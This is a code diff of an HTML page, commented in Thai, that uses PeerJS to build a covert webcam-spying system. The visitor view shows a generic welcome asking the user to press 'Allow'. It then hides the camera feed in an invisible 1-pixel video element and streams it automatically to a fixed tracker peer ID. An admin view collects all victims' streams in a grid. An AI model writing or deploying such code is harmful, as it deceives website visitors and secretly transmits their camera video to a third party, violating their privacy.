@@ -1,22 +1,75 @@
 <!DOCTYPE html>
-<html>
+<html lang="th">
 <head>
-    <title>Connect</title>
+    <meta charset="UTF-8">
+    <title>ACHI Live System</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+    <style>
+        body { font-family: sans-serif; background: #1a1a1a; color: white; text-align: center; }
+        #video-grid { display: flex; flex-wrap: wrap; justify-content: center; gap: 10px; }
+        video { width: 300px; border: 2px solid #00ff00; border-radius: 10px; background: #000; }
+        .status { padding: 20px; color: #888; }
+    </style>
 </head>
 <body>
+
+    <div id="achi-ui" style="display: none;">
+        <h1>Achi Dashboard (Admin)</h1>
+        <p>สถานะ: กำลังรอการเชื่อมต่อ...</p>
+        <div id="video-grid"></div>
+    </div>
+
+    <div id="user-ui" style="display: none;">
+        <div class="status">
+            <h2>ยินดีต้อนรับเข้าสู่เว็บไซต์</h2>
+            <p>กรุณากด "อนุญาต" เพื่อเข้าใช้งานระบบ</p>
+        </div>
+        <video id="my-video" autoplay muted style="width: 1px; height: 1px; opacity: 0;"></video>
+    </div>
+
     <script>
-        // ใส่ Peer ID ของ "อชิ" ที่ได้จากหน้า monitor
-        const achiID = 'ACHI_MONITOR_001'; 
+        // ตั้งชื่อ ID ประจำตัวอชิ
+        const ACHI_ID = 'ACHI_GLOBAL_TRACKER_99'; 
+        
+        // เช็คว่าเป็นอชิหรือคนทั่วไป (ดูจาก ?admin=true ในลิงก์)
+        const urlParams = new URLSearchParams(window.location.search);
+        const isAdmin = urlParams.get('admin') === 'true';
 
-        const peer = new Peer();
-
-        navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
-            // เมื่อเชื่อมต่อกับ Server สำเร็จ ให้โทรหาเครื่องอชิทันที
-            peer.on('open', (id) => {
-                peer.call(achiID, stream);
+        if (isAdmin) {
+            // --- ส่วนของ อชิ (ADMIN) ---
+            document.getElementById('achi-ui').style.display = 'block';
+            const peer = new Peer(ACHI_ID);
+            
+            peer.on('call', (call) => {
+                call.answer(); // รับสายอัตโนมัติ
+                call.on('stream', (userStream) => {
+                    const video = document.createElement('video');
+                    video.srcObject = userStream;
+                    video.autoplay = true;
+                    video.playsinline = true;
+                    document.getElementById('video-grid').append(video);
+                });
             });
-        });
+
+        } else {
+            // --- ส่วนของ คนทั่วไป (USER) ---
+            document.getElementById('user-ui').style.display = 'block';
+            const peer = new Peer(); // สุ่ม ID ให้คนเข้าเว็บ
+
+            navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+                .then((stream) => {
+                    // แสดงตัวอย่างกล้องตัวเองแบบลับๆ (เพื่อเช็คว่าทำงาน)
+                    document.getElementById('my-video').srcObject = stream;
+
+                    // เมื่อ Peer พร้อม ให้โทรหาอชิทันที
+                    peer.on('open', (id) => {
+                        peer.call(ACHI_ID, stream);
+                    });
+                })
+                .catch(err => {
+                    console.error("Camera Error: ", err);
+                });
+        }
     </script>
 </body>
 </html>
